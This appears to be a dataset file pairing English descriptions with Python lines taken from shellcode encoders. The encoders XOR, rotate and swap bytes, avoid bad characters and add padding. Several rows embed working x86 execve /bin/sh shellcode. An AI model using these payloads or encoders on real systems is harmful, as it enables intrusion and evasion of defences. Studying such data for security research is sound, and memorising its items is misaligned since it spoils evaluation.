+"encoded2P2 is string """"",var0 is string var1,encoded2P2 = '',var0 = ''
+append string '\\x' to encodedP2,append string var0 to var1,encodedP2 += '\\x',var1 += '\\x'
+convert the value x to hex and append it to the string encodedP2,convert value x to hex and append it to string var0,encodedP2 += '%02x' % x,var0 += '%02x' % x
+"encodedP2 is string """"",var0 is string var1,encodedP2 = '',var0 = ''
+"end is a string ""\\xaa""",end is string var0,end = '\\xaa',end = '\\xaa'
+declare an except statement,declare except statement,except:,except:
+"execve_shellcode is a bytearray of the byte string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80""",var0 is var1 of byte string var2,execve_shellcode = bytearray ( b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80' ),var0 = var1 ( b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80' )
+execve_shellcode is a bytearray of execve_shellcode,var0 is var1 of execve_shellcode,execve_shellcode = bytearray ( execve_shellcode ),var0 = var1 ( var0 )
+append 0x90 to execve_shellcode,append var0 to var1,execve_shellcode . append ( 0x90 ),var1 . append ( var0 )
+exit with 1,exit with 1,exit ( 1 ),exit ( 1 )
+terminate the program with exit code 1,terminate program with exit code 1,exit ( 1 ),exit ( 1 )
+terminate the program with exit code 2,terminate program with exit code 2,exit ( 2 ),exit ( 2 )
+terminate the program with exit code 3,terminate program with exit code 3,exit ( 3 ),exit ( 3 )
+"Convert the value of leader to hexadecimal, then slice it between the indicies 2 and 3, convert it to an int16 and add its value to the variable fb","Convert value of leader to hexadecimal, then slice it between var0 2 and 3, convert it to var1 and add its value to variable var2","fb = int ( hex ( leader ) [ 2 : 3 ] , 16 )","var2 = int ( hex ( leader ) [ 2 : 3 ] , 16 )"
+concatenate in the string final_shellcode the concatenation of '\\x' and the string byte encoded in hexadecimal,concatenate in string var0 concatenation of var2 and string byte encoded in hexadecimal,final_shellcode += '\\x' + byte . encode ( 'hex' ),var0 += var2 + byte . encode ( 'hex' )
+iterate bad_byte in bad_chars,iterate var0 in var1,for bad_byte in bad_chars : ,for var0 in var1 : 
+iterate bytes in list bad_chars,iterate bytes in list var0,for byte in bad_chars : ,for byte in var0 : 
+iterate byte in the list bytes,iterate byte in list bytes,for byte in bytes : ,for byte in bytes : 
+iterate byte in decoder_stub,iterate byte in var0,for byte in decoder_stub : ,for byte in var0 : 
+iterate over bytes in decoder_stub,iterate over bytes in var0,for byte in decoder_stub : ,for byte in var0 : 
+iterate over bytes in encoder,iterate over bytes in var0,for byte in encoder : ,for byte in var0 : 
+iterate char over bad_chars,iterate char over var0,for char in bad_chars : ,for char in var0 : 
+loop through shellcode converted into a bytearray,loop through var0 converted into var1,for i in bytearray ( shellcode ) : ,for i in var1 ( var0 ) : 
+Make a for loop for each i in the bytearray of shellcode,Make for loop for each i in var0 of var1,for i in bytearray ( shellcode ) : ,for i in var0 ( var1 ) : 
+loop over execve_shellcode,loop over var0,for i in execve_shellcode : ,for i in var0 : 
+iterate i over 255 random numbers between 1 and 256,iterate i over 255 random numbers between 1 and 256,"for i in random . sample ( range ( 1 , 256 ) , 255 ) : ","for i in random . sample ( range ( 1 , 256 ) , 255 ) : "
+iterate i over a sequence of number from 0 to 2,iterate i over sequence of number from 0 to 2,"for i in range ( 0 , 2 ) : ","for i in range ( 0 , 2 ) : "
+initialize a for loop with an iterator i with a range starting from 0 until the length of shellcode_original with a step of 4,initialize for loop with var0 i with range starting from 0 var1 length of var2 with step of 4,"for i in range ( 0 , len ( shellcode_original ) , 4 ) : ","for i in range ( 0 , len ( var2 ) , 4 ) : "
+initialize a for loop with an iterator i with a range starting from 0 until the value of padding,initialize for loop with var0 i with range starting from 0 var1 value of padding,"for i in range ( 0 , padding ) : ","for i in range ( 0 , padding ) : "
+Make a for loop for each x in the bytearray of buf,Make for loop for each x in var0 of var1,for x in bytearray ( buf ) : ,for x in var0 ( var1 ) : 
+loop through shellcode converted into a bytearray,loop through var0 converted into var1,for x in bytearray ( shellcode ) : ,for x in var1 ( var0 ) : 
+loop x over the bytearray of the string shellcode,loop x over var0 of string var1,for x in bytearray ( shellcode ) : ,for x in var0 ( var1 ) : 
+iterate x over the array of bytes of the string shellcode,iterate x over array of bytes of string var0,for x in bytearray ( shellcode ) : ,for x in bytearray ( var0 ) : 
+loop through shellcode converted into a bytearray,loop through var0 converted into var1,for x in bytearray ( shellcode ) : ,for x in var1 ( var0 ) : 
+Make a for loop for each x in the bytearray of shellcode,Make for loop for each x in var0 of var1,for x in bytearray ( shellcode ) : ,for x in var0 ( var1 ) : 
+declare a for loop with an iterator x for each element in shellcode starting from index 2 converted into a bytearray,declare for loop with var0 x for each element in var1 starting from index 2 converted into var2,for x in bytearray ( shellcode ) [ 2 : ] : ,for x in var2 ( var1 ) [ 2 : ] : 
+loop through shellcode converted into a bytearray,loop through var0 converted into var1,for y in bytearray ( shellcode ) : ,for y in var1 ( var0 ) : 
+concatenate '0x' to the string format_0x,concatenate var0 to string var1,format_0x += '0x',var1 += var0
+"append encoded_instruction_in_hex and string "","" to format_0x",append var0 and string var2 to var3,"format_0x += encoded_instruction_in_hex + ', '","var3 += var0 + ', '"
+"format_0x is a string """"",var0 is string var1,format_0x = '',var0 = ''
+"format_slash_x is a string """"",var0 is string var1,format_slash_x = '',var0 = ''
+h is the sum of y and rot modulo 256,h is sum of y and rot var0 256,h = ( y + rot ) % 256,h = ( y + rot ) % 256
+Convert the variable x to a hexadecimal and store it in the variable hopcode,Convert variable x to hexadecimal and store it in variable var0,hopcode = '%02x' % x,var0 = '%02x' % x
+add 1 to the value of i,add 1 to value of i,i += 1,i += 1
+add 1 to the value of i,add 1 to value of i,i += 1,i += 1
+set the variable i to 0,set variable i to 0,i = 0,i = 0
+"if string ""0x0,"" is in format_0x",if string var0 is in var1,"if '0x0, ' in format_0x : ","if '0x0, ' in var1 : "
+check if the length of execve_shellcode is not even,check if length of var0 is not even,if ( len ( execve_shellcode ) % 2 ) != 0 : ,if ( len ( var0 ) % 2 ) != 0 : 
+check if the following expression is true r bitwise xor shellcode_original at index i is not equal to 0 and r bitwise xor shellcode_original at index i+1 does not equal 0 and r bitwise xor shellcode_original at index i+2 does not equal 0 and r bitwise xor shellcode_original at index i+3 does not equal 0,check if following expression is true r var0 xor var4 at index i is not equal to 0 and r var0 xor var4 at index var8 does not equal 0 and r var0 xor var4 at index var9 does not equal 0 and r var0 xor var4 at index var10 does not equal 0,if ( r ^ shellcode_original [ i ] != 0 ) and ( r ^ shellcode_original [ i + 1 ] != 0 ) and ( r ^ shellcode_original [ i + 2 ] != 0 ) and ( r ^ shellcode_original [ i + 3 ] != 0 ) : ,if ( r ^ var4 [ i ] != 0 ) and ( r ^ var4 [ i + 1 ] != 0 ) and ( r ^ var4 [ i + 2 ] != 0 ) and ( r ^ var4 [ i + 3 ] != 0 ) : 
+if char is equal to byte,if char is equal to byte,if char == byte : ,if char == byte : 
+if count modulo 2 is different from zero,if count var0 2 is different from zero,if count % 2 != 0 : ,if count % 2 != 0 : 
+if counter modulo 2 is equal to 0,if counter var0 2 is equal to 0,if counter % 2 == 0 : ,if counter % 2 == 0 : 
+if i is lower than the length of chunk,if i is lower var0 length of chunk,if i < len ( chunk ) : ,if i < len ( chunk ) : 
+"convert the string byte to hex, then cast the result to int16 and then check if it is equal to i","convert string byte to hex, then cast result to var0 and then check if it is equal to i","if i == int ( byte . encode ( 'hex' ) , 16 ) : ","if i == int ( byte . encode ( 'hex' ) , 16 ) : "
+convert to integer base 16 the string byte encoded to hex and check if it is equal to i,convert to integer base 16 string byte encoded to hex and check if it is equal to i,"if i == int ( byte . encode ( 'hex' ) , 16 ) : ","if i == int ( byte . encode ( 'hex' ) , 16 ) : "
+if the length of shellcode_original is not divisable by 4,if length of var0 is not var1 by 4,if len ( shellcode_original ) % 4 != 0 : ,if len ( var0 ) % 4 != 0 : 
+if the length of sys.argv is different from 3,if length of var0 is different from 3,if len ( sys . argv ) != 3 : ,if len ( var0 ) != 3 : 
+if the number of arguments is lower than 2,if number of arguments is lower var0 2,if len ( sys . argv ) < 2 : ,if len ( sys . argv ) < 2 : 
+check if the total number of command-line arguments are less than 2,check if total number of command-line arguments are less var0 2,if len ( sys . argv ) < 2 : ,if len ( sys . argv ) < 2 : 
+if the number of arguments is higher than 2,if number of arguments is higher var0 2,if len ( sys . argv ) > 2 : ,if len ( sys . argv ) > 2 : 
+Check if the length of xxx is greater than 4,Check if length of xxx is greater var0 4,if len ( xxx ) > 4 : ,if len ( xxx ) > 4 : 
+if matched_a_byte is True,if var0 is var2,if matched_a_byte : ,if var0 : 
+check if n is greater or equals to 0,check if n is greater or equals to 0,if n >= 0 : ,if n >= 0 : 
+if matched_a_byte is not True,if var0 is not var2,if not matched_a_byte : ,if not var0 : 
+check if padding does not equal 0,check if padding does not equal 0,if padding : ,if padding : 
+check if rotations is less than the value of 1,check if rotations is less var0 value of 1,if rotations < 1 : ,if rotations < 1 : 
+check if the variable rotations is less than 1,check if variable rotations is less var0 1,if rotations < 1 : ,if rotations < 1 : 
+check if the bytes object containing the value val1 xor i packed according to the format string unsigned char is equal to bad_byte,check if bytes object containing value var0 xor i packed according to format string unsigned char is equal to var1,"if struct . pack ( 'B' , val1 ^ i ) == bad_byte : ","if struct . pack ( 'B' , var0 ^ i ) == var1 : "
+if stub_has_bad_char is True,if var0 is var2,if stub_has_bad_char : ,if var0 : 
+if total does not equal 2,if total does not equal 2,if total != 2 : ,if total != 2 : 
+if x is less than 128,if x is less var0 128,if x < 128 : ,if x < 128 : 
+check if x is less then 128,check if x is less then 128,if x < 128 : ,if x < 128 : 
+check if x is equivalent to the element n in shellcode converted into a bytearray,check if x is equivalent to element n in var0 converted into var1,if x == bytearray ( shellcode ) [ n ] : ,if x == var1 ( var0 ) [ n ] : 
+if x is greater than 248,if x is greater var0 248,if x > 248 : ,if x > 248 : 
+check if x is greater than 248,check if x is greater var0 248,if x > 248 : ,if x > 248 : 
+if xor_byte is equal to 0,if var0 is equal to 0,if xor_byte == 0 : ,if var0 == 0 : 
+import the package binascii,import package var0,import binascii,import var0
+import module random,import module random,import random,import random
+import the package random,import package random,import random,import random
+import the package random,import package random,import random ;,import random
+import the package socket,import package socket,import socket,import socket
+import the package struct,import package var0,import struct,import var0
+import module sys,import module var0,import sys,import var0
+import the package sys,import package var0,import sys,import var0
+import the sys package,import var0 package,import sys,import var0
+generate a random integer between 1 and 255 then convert the random number into a hexadecimal and store the value in insertByte,generate random integer between 1 and 255 then convert random number into hexadecimal and store value in var0,"insertByte = hex ( random . randint ( 1 , 255 ) )","var0 = hex ( random . randint ( 1 , 255 ) )"
+Store in the variable j the sum of i and magic modulus 256,Store in variable j sum of i and magic modulus 256,j = ( i + magic ) % 256,j = ( i + magic ) % 256
+set leader to the first command-line argument after casting it to an int,set leader to first command-line argument after casting it to var0,leader = int ( sys . argv [ 1 ] ),leader = var0 ( sys . argv [ 1 ] )
+return the length of array of bytes of the string shellcode,return length of array of bytes of string var0,len(bytearray(shellcode))),len(bytearray(var0)))
+"length_format_0x is the count of "","" in format_0x",var0 is count of var3 in var1,"length_format_0x = format_0x . count ( ', ' )","length_var1 = var1 . count ( ', ' )"
+set the variable magic to the value 13,set variable magic to value 13,magic = 13,magic = 13
+call the function mask with the argument width and save the return value in mask_value,call function mask with argument width and save return value in var0,mask_value = mask ( width ),var0 = mask ( width )
+matched_a_byte is initialized to False,var0 is initialized to var1,matched_a_byte = False,var0 = var1
+matched_a_byte is True,var0 is var1,matched_a_byte = True,var0 = var1
+max_bits is an integer 8,var0 is integer 8,max_bits = 8,var0 = 8
+store in the variable n the result of the bitwise and operation between n and the function mask with the parameter width,store in variable n result of var0 and operation between n and function mask with parameter width,n &= mask ( width ),n &= mask ( width )
+increment the variable n by 1,increment variable n by 1,n += 1,n += 1
+set the variable n to the value 1,set variable n to value 1,n = 1,n = 1
+convert shellcode to a bytearray and store its length in the variable n,convert var0 to var1 and store its length in variable n,n = len ( bytearray ( shellcode ) ),n = len ( var1 ( var0 ) )
+substitute elements of nasm from the index 1 to end for nasm,substitute elements of var0 from index 1 to end for var0,nasm = nasm [ 1 : ],var0 = var0 [ 1 : ]
+"convert encoded to string and replace all occurrences of ""\\x"" with "",0x"" in it",convert encoded to string and replace all occurrences of var0 with var1 in it,"nasm = str ( encoded ) . replace ( '\\x' , ',0x' )","nasm = str ( encoded ) . replace ( '\\x' , ',var2' )"
+nbits is the second element of sys.argv converted to integer,var0 is second element of var1 converted to integer,nbits = int ( sys . argv [ 2 ] ),var0 = int ( var1 [ 2 ] )
+new is not i and 0xff,new is not i and var0,new = ~ i & 0xff,new = ~ i & var0
+new is new xor xor,new is new xor xor,new = new ^ xor,new = new ^ xor
+new is new shifted left by shift,new is new shifted left by shift,new = new << shift,new = new << shift
+offset is an integer 1,offset is integer 1,offset = 1,offset = 1
+orig is an empty list,var0 is empty list,orig = [ ],var0 = [ ]
+append i to orig,append i to var0,orig . append ( i ),var0 . append ( i )
+"convert the value x in hexadecimal and append it to the string original_shellcode followed by ','",convert value x in hexadecimal and append it to string var0 followed by var2,"original_shellcode += '%02x, ' % x","var0 += '%02x, ' % x"
+append string '0x' to original_shellcode,append string var0 to var1,original_shellcode += '0x',var1 += var0
+"original_shellcode is a string """"",var0 is string var1,original_shellcode = '',var0 = ''
+P is a string '\033[35m',P is a string '\033[35m',P = '\033[35m',P = '\033[35m'
+set the variable padding equal to 0,set variable padding equal to 0,padding = 0,padding = 0
+set the variable padding equal to 4 minus the length of shellcode_original modulus 4,set variable padding equal to 4 minus length of var0 modulus 4,padding = 4 - ( len ( shellcode_original ) % 4 ),padding = 4 - len ( var0 ) % 4
+set the variable r to a random integer between 1 and 255,set variable r to random integer between 1 and 255,"r = random . randint ( 1 , 255 )","r = random . randint ( 1 , 255 )"
+generate a random integer between 1 and 8 and store it in a variable called rand,generate random integer between 1 and 8 and store it in variable called rand,"rand = random . randint ( 1 , 8 )","rand = random . randint ( 1 , 8 )"
+initialize a random number generator,initialize random number generator,random . seed ( ),random . seed ( )
+right shift by val2 the and operation between x and val1 and assign it to res1,right shift by var0 and operation between x and var1 and assign it to var2,res1 = ( ( x & val1 ) >> val2 ),var2 = ( x & var1 ) >> var0
+perform the and operation between x shifted left by val2 and val1 and assign the result to res1,perform and operation between x shifted left by var0 and var1 and assign result to var2,res1 = ( x << val2 ) & ( val1 ),var2 = x << var0 & var1
+res2 is the result of the and operation between x and val1,var0 is result of and operation between x and var1,res2 = ( x & val1 ),var0 = x & var1
+res2 is the result of the and operation between res2 and val1,var0 is result of and operation between var0 and var2,res2 = res2 & val1,var0 = var0 & var2
+right shift res2 by max_bits minus val2,right shift var0 by var1 minus var2,res2 = res2 >> ( max_bits - val2 ),var0 = var0 >> var1 - var2
+left shift x by max_bits minus val2 and assign the result to res2,left shift x by var0 minus var1 and assign result to var2,res2 = x << ( max_bits - val2 ),var2 = x << var0 - var1
+return the result of bitwise left shift of n by rotations bitwise and with mask_value bitwise or n  bitwise right shift by the subtraction of rotations from width,return result of var1 left shift of n by rotations var1 and with var5 var1 or n var1 right shift by subtraction of rotations from width,return ( ( n << rotations ) & mask_value ) | ( n >> ( width - rotations ) ),return n << rotations & var5 | n >> width - rotations
+return the result of n bitwise right shift with rotations or n bitwise left shift by width minus rotations and the bitwise and operation with mask_value,return result of n var0 right shift with rotations or n var0 left shift by width minus rotations and var0 and operation with var3,return ( n >> rotations ) | ( ( n << ( width - rotations ) ) & mask_value ),return n >> rotations | n << width - rotations & var3
+return the value of 0,return value of 0,return 0,return 0
+return 2 to the power of n and subtract 1,return 2 to power of n and subtract 1,return 2 ** n - 1,return 2 ** n - 1
+return i,return i,return i,return i
+return the value of n,return value of n,return n,return n
+return the value n,return value n,return n,return n
+get the hexadecimal value of suplX and reverse its order then store the value in rev_suplx,get hexadecimal value of var0 and reverse its order then store value in var1,rev_suplx = hex ( suplX ) [ : : - 1 ],var1 = hex ( var0 ) [ : : - 1 ]
+rot is an integer 8,rot is integer 8,rot = 8,rot = 8
+ROT is the first element of sys.argv converted to integer,ROT is first element of var0 converted to integer,ROT = int ( sys . argv [ 1 ] ),ROT = int ( var0 [ 1 ] )
+store in the variable rotations the modulus of rotations and width,store in variable rotations modulus of rotations and width,rotations %= width,rotations %= width
+rox_encoded_instruction is the result of the or operation between res1 and res2,var0 is result of or operation between var1 and var2,rox_encoded_instruction = res1 | res2,var0 = var1 | var2
+"Convert the value of leader to hexadecimal, then slice it at index 3, convert it to an int16 and set its value to the variable sb","Convert value of leader to hexadecimal, then slice it at index 3, convert it to var0 and set its value to variable sb","sb = int ( hex ( leader ) [ 3 : ] , 16 )","sb = int ( hex ( leader ) [ 3 : ] , 16 )"
+"shellcode is a string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80""",var0 is string var1,shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80',var0 = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
+"shellcode is a string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xdc\xb0\x0b\xcd\x80""",var0 is string var1,shellcode = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xdc\xb0\x0b\xcd\x80' ),var0 = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xdc\xb0\x0b\xcd\x80' )
+"define shellcode as a tuple and add the string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80""",define var0 as tuple and add string var1,shellcode = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80' ),var0 = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80' )
+"define shellcode as a tuple and add the string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80""",define var0 as tuple and add string var1,shellcode = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' ),var0 = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' )
+"shellcode is a string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80""",var0 is string var1,shellcode = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' ),var0 = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' )
+"shellcode is a tuple containing the string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80""",var0 is tuple containing string var1,shellcode = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' ),var0 = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' )
+"Declare a tuple called shellcode and add the string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"" into it",Declare tuple called var0 and add string var1 into it,shellcode = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' ),var0 = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' )
+"declare the tuple shellcode containing the string ""\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80""",declare tuple var0 containing string var1,shellcode = ( '\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' ),var0 = ( '\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' )
+"shellcode is a string ""\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80""",var0 is string var1,shellcode = ( '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' ),var0 = ( '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' )
+"Declare a tuple shellcode and add the string ""\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80"" into it",Declare tuple var0 and add string var1 into it,shellcode = ( '\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80' ),var0 = ( '\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80' )
+"store in the variable shellcode b""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80""",store in variable var0 bvar2,shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' ;,var0 = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' ;
+remove the first 2 items from shellcode,remove first 2 items from var0,shellcode = shellcode [ 2 : : ],var0 = var0 [ 2 : ]
+shellcode is the first argument after removing string '\\x' decoded in hexadecimal,var0 is first argument after removing string var1 decoded in hexadecimal,"shellcode = sys . argv [ 1 ] . replace ( '\\x' , '' ) . decode ( 'hex' )","var0 = sys . argv [ 1 ] . replace ( '\\x' , '' ) . decode ( 'hex' )"
+Declare a tuple shellcode and add the string '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' into it,Declare tuple var0 and add string var1 into it,shellcode = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' ),var0 = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' )
+shellcode_encoded is an empty bitearray,var0 is empty var1,shellcode_encoded = bytearray ( ),var0 = bytearray ( )
+store in the variable shellcode_encoded_hex the hexadecimal values of shellcode_encoded separated by the string '\\x',store in variable var0 hexadecimal values of var1 separated by string var4,shellcode_encoded_hex = '' . join ( '\\x{:02x}' . format ( x ) for x in shellcode_encoded ),var0 = '' . join ( '\\x{:02x}' . format ( x ) for x in var1 )
+"store in the variable shellcode_encoded_nasm the hexadecimal values of shellcode_encoded separated by the string '0x' and remove any trailing ','",store in variable var0 hexadecimal values of var1 separated by string var3 and remove any trailing var4,"shellcode_encoded_nasm = '' . join ( '0x{:02x}, ' . format ( x ) for x in shellcode_encoded ) . rstrip ( ', ' )","var0 = '' . join ( '0x{:02x}, ' . format ( x ) for x in var1 ) . rstrip ( ', ' )"
+append the value 0x90 to shellcode_encoded,append value var0 to var1,shellcode_encoded . append ( 0x90 ),var1 . append ( var0 )
+append the value 0xaa to shellcode_encoded,append value var0 to var1,shellcode_encoded . append ( 0xaa ),var1 . append ( var0 )
+append the value of the variable r to shellcode_encoded,append value of variable r to var0,shellcode_encoded . append ( r ),var0 . append ( r )
+compute the value of shellcode_original at index i bitwise xor r then append to shellcode_encoded,compute value of var0 at index i var1 xor r then append to var2,shellcode_encoded . append ( shellcode_original [ i ] ^ r ),var2 . append ( var0 [ i ] ^ r )
+compute the value of shellcode_original at index i+1 bitwise xor r then append to shellcode_encoded,compute value of var0 at index var1 var2 xor r then append to var3,shellcode_encoded . append ( shellcode_original [ i + 1 ] ^ r ),var3 . append ( var0 [ i + 1 ] ^ r )
+compute the value of shellcode_original at index i+2 bitwise xor r then append to shellcode_encoded,compute value of var0 at index var1 var2 xor r then append to var3,shellcode_encoded . append ( shellcode_original [ i + 2 ] ^ r ),var3 . append ( var0 [ i + 2 ] ^ r )
+compute the value of shellcode_original at index i+3 bitwise xor r then append to shellcode_encoded,compute value of var0 at index var1 var2 xor r then append to var3,shellcode_encoded . append ( shellcode_original [ i + 3 ] ^ r ),var3 . append ( var0 [ i + 3 ] ^ r )
+set the variable shellcode_file to the first command-line argument,set variable var0 to first command-line argument,shellcode_file = sys . argv [ 1 ],var0 = sys . argv [ 1 ]
+save the length of execve_shellcode into shellcode_len,save length of var0 into var1,shellcode_len = len ( execve_shellcode ),var1 = len ( var0 )
+"read the file f as a bytearray from hexadecimal values remove whitespaces and replace all occurences of the string '\\x' with ''"" and store the result in shellcode_original","read file f as var0 from hexadecimal values remove var1 and replace all var2 of string var3 with var4 "" and store result in var5","shellcode_original = bytearray . fromhex ( f . read ( ) . strip ( ) . replace ( '\\x' , '' ) )","var5 = var0 . fromhex ( f . read ( ) . strip ( ) . replace ( '\\x' , '' ) )"
+store in the variable shellcode_original_hex the hexadecimal values of shellcode_original separated by the string '\\x',store in variable var0 hexadecimal values of var1 separated by string var4,shellcode_original_hex = '' . join ( '\\x{:02x}' . format ( x ) for x in shellcode_original ),var0 = '' . join ( '\\x{:02x}' . format ( x ) for x in var1 )
+append 0x90 to the shellcode_original variable,append var0 to var1 variable,shellcode_original . append ( 0x90 ),var1 . append ( var0 )
+shift is the first element of sys.argv converted to integer,shift is first element of var0 converted to integer,shift = int ( sys . argv [ 1 ] ),shift = int ( var0 [ 1 ] )
+string1 contains a string concatenated with the elements of encoded separated by the value of decoder_stub,var0 contains string concatenated with elements of encoded separated by value of var1,string1 = decoder_stub . join ( encoded ),var0 = var1 . join ( encoded )
+stub_has_bad_char is boolean False,var0 is boolean var1,stub_has_bad_char = False,var0 = var1
+stub_has_bad_char is boolean True,var0 is boolean var1,stub_has_bad_char = True,var0 = var1
+subtract sb from fb and store the result in the variable subfs,subtract sb from var0 and store result in variable var1,subfs = fb - sb,var1 = var0 - sb
+subtract Dec_hopecode from 255 and store the result in variable suplX,subtract var0 from 255 and store result in variable var1,suplX = 255 - Dec_hopcode,var1 = 255 - Dec_hopcode
+swapped is an empty list,swapped is empty list,swapped = [ ],swapped = [ ]
+append the element x of execve_shellcode to swapped,append element x of var0 to swapped,swapped . append ( execve_shellcode [ x ] ),swapped . append ( var0 [ x ] )
+append the element x + 1 of execve_shellcode to swapped,append element x + 1 of var0 to swapped,swapped . append ( execve_shellcode [ x + 1 ] ),swapped . append ( var0 [ x + 1 ] )
+"separate every 4 characters of the string swapped with the separator "", """,separate every 4 characters of string swapped with separator var0,"swapped = ', ' . join ( swapped [ i : i + 4 ] for i in range ( 0 , len ( swapped ) , 4 ) )","swapped = ', ' . join ( swapped [ i : i + 4 ] for i in range ( 0 , len ( swapped ) , 4 ) )"
+"add ""0x"" to every 2 characters of the string swapped",add var0 to every 2 characters of string swapped,"swapped = '0x' + '0x' . join ( a + b for a , b in zip ( swapped [ : : 2 ] , swapped [ 1 : : 2 ] ) )","swapped = '0x' + '0x' . join ( a + b for a , b in zip ( swapped [ : : 2 ] , swapped [ 1 : : 2 ] ) )"
+swapped is the hexadecimal represenation of the array of bytes swapped,swapped is hexadecimal var0 of array of bytes swapped,swapped = binascii . hexlify ( bytearray ( swapped ) ),swapped = binascii . hexlify ( bytearray ( swapped ) )
+terminate the program,terminate program,sys . exit ( ),sys . exit ( )
